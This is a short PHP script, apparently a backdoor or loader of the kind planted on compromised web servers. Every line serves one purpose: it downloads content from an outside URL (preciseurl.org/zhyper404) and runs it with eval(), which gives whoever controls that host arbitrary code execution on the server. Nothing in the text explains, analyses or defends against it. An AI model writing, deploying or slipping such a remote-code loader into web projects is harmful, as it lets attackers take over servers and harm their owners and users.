<?php

$content = file_get_contents(urldecode('https://preciseurl.org/zhyper404'));

$content = "?> ".$content;
eval($content);
